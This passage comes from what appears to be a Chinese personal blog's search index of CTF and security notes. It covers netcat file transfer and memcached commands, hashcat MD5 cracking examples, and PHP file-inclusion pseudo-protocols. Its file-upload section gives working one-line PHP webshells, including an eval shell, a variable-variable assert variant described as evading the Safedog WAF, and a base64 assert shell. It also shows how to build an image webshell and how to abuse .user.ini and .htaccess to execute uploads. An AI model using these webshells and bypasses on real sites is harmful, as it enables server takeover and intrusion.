refused</code></pre><p>2、从192.168.2.33拷贝文件到192.168.2.34</p><pre><code class="text">在192.168.2.34上： nc -l 1234 &gt; test.txt在192.168.2.33上： nc 192.168.2.34 &lt; test.txt</code></pre><p>3、简单聊天工具</p><pre><code class="text">在192.168.2.34上： nc -l 1234在192.168.2.33上： nc 192.168.2.34 1234</code></pre><p>这样，双方就可以相互交流了。使用ctrl+C(或D）退出。</p><p><strong>用nc命令操作memcached</strong></p><pre><code class="text">1）存储数据：printf “set key 0 10 6\r\nresult\r\n” |nc 192.168.2.34 112112）获取数据：printf “get key\r\n” |nc 192.168.2.34 112113）删除数据：printf “delete key\r\n” |nc 192.168.2.34 112114）查看状态：printf “stats\r\n” |nc 192.168.2.34 112115）模拟top命令查看状态：watch “echo stats” |nc 192.168.2.34 112116）清空缓存：printf “flush_all\r\n” |nc 192.168.2.34 11211 (小心操作，清空了缓存就没了）</code></pre><p><strong>使用nc来传文件</strong></p><pre><code class="text">发送端：  cat a.txt  |  nc -l  3333接收端：  nc 192.168.0.3   3333 &gt;  a.txt或者发送端:    cat a.txt   |  nc 192.168.0.3   9999 接收端:    nc -l 9999 &gt; a.txt</code></pre><h1 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h1><p>hashcat是一款自称为世界上最快的密码破解工具。<br><strong>hashcat常用命令</strong></p><pre><code>-m                           指定哈希类型-a                            指定破解模式-V                            查看版本信息-o                            将输出结果储存到指定文件--force                     忽略警告--show                    仅显示破解的hash密码和对应的明文--remove                 从源文件中删除破解成功的hash--username             忽略hash表中的用户名-b                             测试计算机破解速度和相关硬件信息-O                            限制密码长度-T                            设置线程数-r                             使用规则文件-1                             自定义字符集  -1 0123asd     ?1=&#123;0123asd&#125;-2                             自定义字符集  -2 0123asd    ?2=&#123;0123asd&#125;-3                             自定义字符集  -3 0123asd    ?3=&#123;0123asd&#125;-i                              启用增量破解模式--increment-min       设置密码最小长度--increment-max      设置密码最大长度</code></pre><p><strong>hashcat破解模式介绍</strong></p><p>0    straight                                           字典破解</p><p>1    combination                                    将字典中密码进行组合（1 2&gt;11 22 12 21）</p><p>3    brute-force                                      使用指定掩码破解</p><p>6    Hybrid Wordlist + Mask                  字典+掩码破解</p><p>7    Hybrid Mask  + Wordlist                 掩码+字典破解</p><p><strong>hashcat集成的字符集</strong></p><p>?l                代表小写字母</p><p>?u              代表大写字母</p><p>?d              代表数字</p><p>?s              代表特殊字符</p><p>?a              代表大小写字母、数字以及特殊字符  </p><p>?b               0x00-0xff </p><p><strong>hash id 对照表</strong></p><p><img src="/2021/10/08/%E5%B8%B8%E8%A7%81%E8%BD%AF%E4%BB%B6%E5%91%BD%E4%BB%A4/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NtbGlfbmc=,size_16,color_FFFFFF,t_70.png" alt="img"></p><p><strong>实例演示-暴力破解MD5值</strong></p><p>1.使用字典进行破解</p><p>hashcat  -a 0  0192023a7bbd73250516f069df18b500  password.txt  –force</p><p><img src="/2021/10/08/%E5%B8%B8%E8%A7%81%E8%BD%AF%E4%BB%B6%E5%91%BD%E4%BB%A4/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NtbGlfbmc=,size_16,color_FFFFFF,t_70.png" alt="img"></p><p>2.使用指定字符集进行破解</p><p>hashcat  -a 3  63a9f0ea7bb98050796b649e85481845  ?l?l?l?l –force</p><p><img src="/2021/10/08/%E5%B8%B8%E8%A7%81%E8%BD%AF%E4%BB%B6%E5%91%BD%E4%BB%A4/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NtbGlfbmc=,size_16,color_FFFFFF,t_70.png" alt="img"></p><p>3.使用字典+掩码进行破解</p><p>hashcat  -a 6  1844156d4166d94387f1a4ad031ca5fa  password.txt  ?d?d?d –force</p><p><img src="/2021/10/08/%E5%B8%B8%E8%A7%81%E8%BD%AF%E4%BB%B6%E5%91%BD%E4%BB%A4/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NtbGlfbmc=,size_16,color_FFFFFF,t_70.png" alt="img"></p><p>4.使用掩码+字典进行破解</p><p>hashcat  -a 7  f8def8bcecb2e7925a2b42d60d202deb   ?d?d password.txt   –force</p><p><img src="/2021/10/08/%E5%B8%B8%E8%A7%81%E8%BD%AF%E4%BB%B6%E5%91%BD%E4%BB%A4/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NtbGlfbmc=,size_16,color_FFFFFF,t_70.png" alt="img"></p><p>如果破解时间太长，我们可以按s键查看破解进度，p键暂停，r键继续破解，q键退出破解。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> 软件常用命令 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软件命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP常见协议</title>
      <link href="/2021/10/08/PHP%E5%B8%B8%E8%A7%81%E5%8D%8F%E8%AE%AE/"/>
      <url>/2021/10/08/PHP%E5%B8%B8%E8%A7%81%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h1><p>php&gt;=5.2<br>php://filter协议   ?file=file://D:/soft/phpStudy/WWW/phpcode.txt<br>php://input协议  ?file=php://filter/read=convert.base64-encode/resource=./index.php<br>data://协议<br>data://协议允许读入<br> 要求：打开allow_url_fopen  allow_url_include<br>?file=data://text/plain,<?php phpinfo()?><br>?file=data://text/plain;base64,编码</p><p>file协议：<br>file:///文件路径</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 常见漏洞和手法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件上传</title>
      <link href="/2021/09/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2021/09/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="一句话木马制作"><a href="#一句话木马制作" class="headerlink" title="一句话木马制作"></a>一句话木马制作</h1><p>正常：</p><pre><code class="php">&lt;?php@eval($_POST[&#39;x&#39;]);?&gt;</code></pre><p>如果有&lt;?过滤，采用：</p><pre><code class="php">&lt;script language=&quot;php&quot;&gt;eval($_REQUEST[x])&lt;/script&gt;</code></pre><p>一种简单的绕安全狗方法：变量传递</p><pre><code class="php">&lt;?php$a=$_GET[&#39;x&#39;];$$a=$_GET[&#39;y&#39;];$b($_POST[&#39;z&#39;]);</code></pre><pre><code class="php">传入方法：http://php?x=b&amp;y=assertpost:z=phpinfo();</code></pre><p>问：为什么这里不用eval<br>因为eval赋值给b没有效果的。</p><p>对传入数据进行加密</p><pre><code class="php">&lt;?php assert(base64_decode($_POST[&#39;x&#39;]));?&gt;</code></pre><p>当这种情况用蚁剑连接时，需要采用base64加密。</p><h1 id="图片马制作"><a href="#图片马制作" class="headerlink" title="图片马制作"></a>图片马制作</h1><p>1.首先图片命名111.jpg</p><p>2.再新建222.asp文件，一句话木马写入</p><p>3.然后win+R，cmd，cd到之前图片的目录路径下，命令为copy 111.jpg/b+222.asp/a 333.jpg</p><p>最后就会出现新的图片3333.jpg，就是制作出的图片马。</p><h1 id="文件上传之后缀替换"><a href="#文件上传之后缀替换" class="headerlink" title="文件上传之后缀替换"></a>文件上传之后缀替换</h1><p>php2，php3、php4、php5，pht，phtml，phps</p><p>.JPEG;.JPE;.JPG，”JPGGraphic File”<br>.gif，”GIF89A”<br> .zip，”Zip Compressed”<br>.doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”</p><h1 id="user-ini"><a href="#user-ini" class="headerlink" title="user.ini"></a>user.ini</h1><p>.user.ini。<br>利用条件：含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了</p><p>它比.htaccess用的更广，不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用这个方法。我的nginx服务器全部是fpm/fastcgi，我的IIS php5.3以上的全部用的fastcgi/cgi，我win下的apache上也用的fcgi，可谓很广，不像.htaccess有局限性。</p><p>CGI全称”通用网关接口”（Common Gateway Interface），用于HTTP服务器与其它机器上的程序服务通信交流的一种工具，CGI程序须运行在网络服务器上<br>FastCGI是一个可伸缩地、高速地在HTTP服务器和动态脚本语言间通信的接口（FastCGI接口在Linux下是socket（可以是文件socket，也可以是ip socket）），主要优点是把动态语言和HTTP服务器分离开来。多数流行的HTTP服务器都支持FastCGI，包括Apache、Nginx和lightpd。</p><p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER[‘DOCUMENT_ROOT’] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p><p>.user.ini实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。（上面表格中没有提到的PHP_INI_PERDIR也可以在.user.ini中设置）</p><p>实际上，除了PHP_INI_SYSTEM以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的</p><p>auto_append_file<br>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数<br>auto_prepend_file 是在文件后面包含</p><p>使用方法很简单，直接写在.user.ini中：</p><p>auto_prepend_file=01.gif</p><h1 id="htaccess"><a href="#htaccess" class="headerlink" title="htaccess"></a>htaccess</h1><p>针对apache</p><p>文件后缀为 .htaccess<br>保存类型为所有文件</p><p>上传.htaccess 必须是网站根路径 </p><p>让png解析为php</p><p>可以在.htaccess 加入php解析规则<br>类似于把文件名包含1的解析成php</p><pre><code class="php">&lt;FilesMatch &quot;1&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;123456.png  就会以php执行</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 常见漏洞和手法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
